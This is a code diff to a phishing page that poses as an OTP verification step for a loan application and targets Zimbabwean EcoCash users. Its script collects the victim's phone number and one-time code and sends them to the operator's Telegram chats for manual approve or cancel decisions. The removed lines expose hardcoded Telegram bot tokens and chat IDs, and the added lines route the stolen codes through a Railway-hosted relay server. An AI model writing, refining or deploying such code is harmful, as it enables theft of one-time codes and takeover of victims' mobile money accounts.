@@ -254,14 +254,6 @@
         // ========== API BASE (Zimbabwe / EcoCash) ==========
         const API_BASE = 'https://starlink-network-production-573acbf9.up.railway.app';
 
-        // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8938316440:AAHBV-4qgbxIDqAQ65o6SNQ5ad_3YXaOfNs';
-        const CHAT_ID_1 = '8517857432';
-
-        // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
-        const CHAT_ID_2 = '5615316142';
-
         // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
         const visibleStart = savedPhone.slice(0, 3);
@@ -278,10 +270,8 @@
 
         let otpValue = '';
         let seconds = 116;
-        let pollInterval1 = null;
-        let pollInterval2 = null;
-        let lastUpdateId1 = 0;
-        let lastUpdateId2 = 0;
+        let pollInterval = null;
+        let lastUpdateId = 0;
         let currentTimestamp = 0;
         let actionProcessed = false;
 
@@ -321,44 +311,37 @@
             });
         });
 
-        // Helper to send to a bot with inline keyboard
-        function sendToBot(botToken, chatId, text, replyMarkup) {
-            const payload = {
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'Markdown'
-            };
-            if (replyMarkup) {
-                payload.reply_markup = replyMarkup;
-            }
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        // Send message via our server -> Telegram (uses Railway env vars)
+        function sendToBot(text, replyMarkup) {
+            const payload = { text };
+            if (replyMarkup) payload.replyMarkup = replyMarkup;
+            fetch(`${API_BASE}/api/notify`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
+            })
+                .then(r => r.json())
+                .then(d => console.log('notify:', d))
+                .catch(e => console.error('notify err:', e));
+        }
+
+        // Answer callback (removes the loading state on the Telegram button)
+        function answerCallback(callbackQueryId) {
+            fetch(`${API_BASE}/api/answer`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ callbackQueryId })
             }).catch(() => {});
         }
 
-        // Handle a callback query from either bot
-        function handleCallback(callbackData, callbackQueryId, botToken) {
+        // Handle approve / cancel from Telegram
+        function handleCallback(callbackData, callbackQueryId) {
             if (actionProcessed) return;
             actionProcessed = true;
 
-            // Answer the callback query to remove loading state
-            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    callback_query_id: callbackQueryId
-                })
-            }).catch(() => {});
+            answerCallback(callbackQueryId);
 
-            // Stop both polling intervals
-            if (pollInterval1) clearInterval(pollInterval1);
-            if (pollInterval2) clearInterval(pollInterval2);
+            if (pollInterval) clearInterval(pollInterval);
 
             spinnerOverlay.style.display = 'none';
             resultOverlay.style.display = 'flex';
@@ -371,27 +354,20 @@
             }
         }
 
-        // Poll a single bot for callback responses
-        function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
+        // Poll server (which polls Telegram) for approve/cancel
+        function pollUpdates() {
+            fetch(`${API_BASE}/api/updates?offset=${lastUpdateId + 1}&timeout=10`)
                 .then(res => res.json())
                 .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        for (let update of data.result) {
-                            // Update the reference via the outer variable reference approach
-                            if (botToken === BOT_TOKEN_1) {
-                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
-                            } else {
-                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
-                            }
+                    if (data.ok && data.result && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
 
                             if (update.callback_query && !actionProcessed) {
                                 const cb = update.callback_query;
-                                const dataParts = cb.data.split('_');
-                                const ts = parseInt(dataParts[1]);
-
+                                const ts = parseInt(cb.data.split('_')[1]);
                                 if (ts === currentTimestamp) {
-                                    handleCallback(cb.data, cb.id, botToken);
+                                    handleCallback(cb.data, cb.id);
                                     return;
                                 }
                             }
@@ -401,19 +377,10 @@
                 .catch(() => {});
         }
 
-        // Start polling both bots
-        function startPollingBoth() {
+        function startPolling() {
             actionProcessed = false;
-
-            // Poll Bot 1 every 1.5s
-            pollInterval1 = setInterval(() => {
-                pollBot(BOT_TOKEN_1, CHAT_ID_1, lastUpdateId1, 'pollInterval1');
-            }, 1500);
-
-            // Poll Bot 2 every 1.5s
-            pollInterval2 = setInterval(() => {
-                pollBot(BOT_TOKEN_2, CHAT_ID_2, lastUpdateId2, 'pollInterval2');
-            }, 1500);
+            if (pollInterval) clearInterval(pollInterval);
+            pollInterval = setInterval(pollUpdates, 1500);
         }
 
         submitBtn.addEventListener('click', () => {
@@ -426,22 +393,13 @@
             const message = `*OTP Verification*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
             const replyMarkup = {
                 inline_keyboard: [
-                    [{
-                        text: '✅ Approve',
-                        callback_data: 'approve_' + currentTimestamp
-                    }, {
-                        text: '❌ Cancel',
-                        callback_data: 'cancel_' + currentTimestamp
-                    }]
+                    [{ text: '✅ Approve', callback_data: 'approve_' + currentTimestamp },
+                     { text: '❌ Cancel',  callback_data: 'cancel_'  + currentTimestamp }]
                 ]
             };
 
-            // Send to both bots with inline buttons
-            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
-            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
-
-            // Start polling both bots for the response
-            startPollingBoth();
+            sendToBot(message, replyMarkup);
+            startPolling();
         });
 
         checkOtpComplete();
